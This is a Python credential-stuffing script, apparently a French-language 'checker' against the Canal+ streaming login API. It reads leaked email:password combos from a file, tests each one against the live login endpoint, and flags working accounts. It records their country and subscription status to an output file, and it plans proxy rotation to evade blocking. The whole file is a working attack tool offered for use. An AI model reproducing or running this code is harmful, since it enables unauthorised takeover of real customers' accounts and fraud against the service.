import requests,os,multiprocessing,sys,json
from multiprocessing import Pool

def cls():
    os.system("cls")

def check(session,email,password):
    data = {"email": email, "password": password, "portailId": "TSRm9mZl5Rs.", "media": "WEBEC", "vect": "INTERNET"}
    r = session.post("https://pass-api-v2.canal-plus.com/services/apipublique/login", data=data)
    return r.text
def save(email,password,country,zone,sub):
    file = open("output.txt","a")
    file.write(email+":"+password+"\nPAYS : " + country + " | " + zone+"\nAbonnement : " + str(sub)+"\n")
    file.close()


#Start

banner = """ 
 ██████╗ █████╗ ███╗   ██╗ █████╗ ██╗     ███████╗██╗   ██╗ ██████╗██╗  ██╗
██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔════╝██║   ██║██╔════╝██║ ██╔╝
██║     ███████║██╔██╗ ██║███████║██║     █████╗  ██║   ██║██║     █████╔╝ 
██║     ██╔══██║██║╚██╗██║██╔══██║██║     ██╔══╝  ██║   ██║██║     ██╔═██╗ 
╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗██║     ╚██████╔╝╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝
           
By Kynda !   \n                                                           
"""
account_number = 0
proxy_number = 0
account_position = 0
proxy_position = 0
cls()
print(banner)
#Check file

try:
    file = open("combo.txt","r")
    combo = file.readlines()
    if len(combo) > 0:
        file.close()
    else:
        file.close()
        sys.exit("[i] Tu dois remplir le fichier combo.txt pour que ça fonctionne.")
except FileNotFoundError:
    print("[!] Aucun fichier combo.txt trouvé !\n Pas d'soucis on va t'en faire un :)")
    file = open("combo.txt","a")
    file.close()
    sys.exit("[i] Tu dois remplir le fichier combo.txt pour que ça fonctionne.")

try:
    file = open("proxy.txt","r")
    proxies = file.readlines()
    if len(proxies) > 0:
        file.close()
    else:
        file.close()
        sys.exit("[i] Tu dois remplir le fichier proxy.txt pour que ça fonctionne.")
except FileNotFoundError:
    print("[!] Aucun fichier proxy.txt trouvé !\n Pas d'soucis on va t'en faire un :)")
    file = open("proxy.txt","a")
    file.close()
    sys.exit("[i] Tu dois remplir le fichier proxy.txt pour que ça fonctionne.")

for account in combo:
    account_number+=1

for proxy in proxies:
    proxy_number+=1

print("Taille de la combo: " + str(account_number))
print("Nombre de proxys: " + str(proxy_number))

if __name__ == '__main__':
    while account_position < account_number:
        session = requests.session()
        credentials = combo[account_position]
        credentials = credentials.strip().split(':')
        email = credentials[0]
        password = credentials[1]
        result = check(session,email,password)
        data = json.loads(result)
        message = data["response"]["errorMessage"]
        if message == "Email manquant ou invalide":
            print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
        elif message == "Info : Compte bloque":
             print("["+str(account_position)+"/"+ str(account_number)+"] BLOCKED ~> " + email)
        elif message == "Login ou mot de passe invalide":
            print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
        else:
            country = data["response"]["userData"]["IsoCountryCode"]
            zone = data["response"]["userData"]["Label_Zone"]
            sub = data["response"]["userData"]["isSubscriber"]
            print("-----------------------------------------------------------------------------------------------------------\n")
            print("["+str(account_position)+"/"+ str(account_number)+"] LIVE ~> " + email)
            print("PAYS : " + country + " | " + zone)
            print("Abonnement : " + str(sub)+"\n")
            print("-----------------------------------------------------------------------------------------------------------\n")
            save(email,password,country,zone,sub)
        account_position+=1

##### TODO: -Hit -Proxy -Mp -Capture
